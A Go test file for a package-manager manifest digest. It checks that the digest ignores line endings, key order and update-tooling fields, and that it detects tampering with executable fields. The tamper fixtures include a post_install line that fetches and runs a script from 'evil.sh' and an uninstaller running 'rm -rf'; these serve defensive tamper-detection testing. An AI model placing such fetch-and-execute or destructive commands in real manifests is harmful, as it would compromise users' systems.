package manifest

import "testing"

const digestBase = `{
  "version": "1.8.2",
  "url": "https://example.com/jq.exe",
  "hash": "sha256:aaaa",
  "bin": "jq.exe",
  "post_install": ["Write-Host hello"],
  "checkver": {"github": "https://github.com/jqlang/jq"},
  "autoupdate": {"url": "https://example.com/$version/jq.exe"}
}`

func mustDigest(t *testing.T, raw string) string {
	t.Helper()
	d, err := Digest([]byte(raw))
	if err != nil {
		t.Fatalf("Digest: %v", err)
	}
	return d
}

// A bucket cloned with core.autocrlf=true has CRLF on every line; the
// same bucket fetched as a zip has LF. goop uses both, so a digest that
// noticed the difference would report drift between machines holding
// identical manifests.
func TestDigest_IgnoresLineEndings(t *testing.T) {
	var crlf []byte
	for _, c := range []byte(digestBase) {
		if c == '\n' {
			crlf = append(crlf, '\r')
		}
		crlf = append(crlf, c)
	}
	if got, want := mustDigest(t, string(crlf)), mustDigest(t, digestBase); got != want {
		t.Errorf("CRLF changed the digest:\n got %s\nwant %s", got, want)
	}
}

func TestDigest_IgnoresFormattingAndKeyOrder(t *testing.T) {
	compact := `{"bin":"jq.exe","hash":"sha256:aaaa","post_install":["Write-Host hello"],` +
		`"url":"https://example.com/jq.exe","version":"1.8.2",` +
		`"autoupdate":{"url":"https://example.com/$version/jq.exe"},` +
		`"checkver":{"github":"https://github.com/jqlang/jq"}}`
	if got, want := mustDigest(t, compact), mustDigest(t, digestBase); got != want {
		t.Errorf("reordering changed the digest:\n got %s\nwant %s", got, want)
	}
}

// checkver and autoupdate produce new manifest versions; they change
// nothing about installing a pinned one.
func TestDigest_IgnoresMaintainerTooling(t *testing.T) {
	churned := `{"version":"1.8.2","url":"https://example.com/jq.exe","hash":"sha256:aaaa",` +
		`"bin":"jq.exe","post_install":["Write-Host hello"],` +
		`"checkver":{"github":"https://github.com/SOMEONE/else"},` +
		`"autoupdate":{"url":"https://example.com/CHANGED/$version/jq.exe"}}`
	if got, want := mustDigest(t, churned), mustDigest(t, digestBase); got != want {
		t.Errorf("maintainer tooling changed the digest -- that is the noise this excludes")
	}
}

// The whole point: a manifest is executable content, and an edit to what
// runs must be visible.
func TestDigest_CatchesScriptChanges(t *testing.T) {
	for name, tampered := range map[string]string{
		"post_install":  `{"version":"1.8.2","url":"https://example.com/jq.exe","hash":"sha256:aaaa","bin":"jq.exe","post_install":["Write-Host hello","irm evil.sh | iex"]}`,
		"url":           `{"version":"1.8.2","url":"https://elsewhere.example/jq.exe","hash":"sha256:aaaa","bin":"jq.exe","post_install":["Write-Host hello"]}`,
		"artifact hash": `{"version":"1.8.2","url":"https://example.com/jq.exe","hash":"sha256:bbbb","bin":"jq.exe","post_install":["Write-Host hello"]}`,
		"uninstaller":   `{"version":"1.8.2","url":"https://example.com/jq.exe","hash":"sha256:aaaa","bin":"jq.exe","post_install":["Write-Host hello"],"uninstaller":{"script":"rm -rf"}}`,
	} {
		if mustDigest(t, tampered) == mustDigest(t, digestBase) {
			t.Errorf("a change to %s went undetected", name)
		}
	}
}

func TestDigest_RejectsInvalidJSON(t *testing.T) {
	if _, err := Digest([]byte(`{"version": oops`)); err == nil {
		t.Error("expected an error for malformed JSON")
	}
}
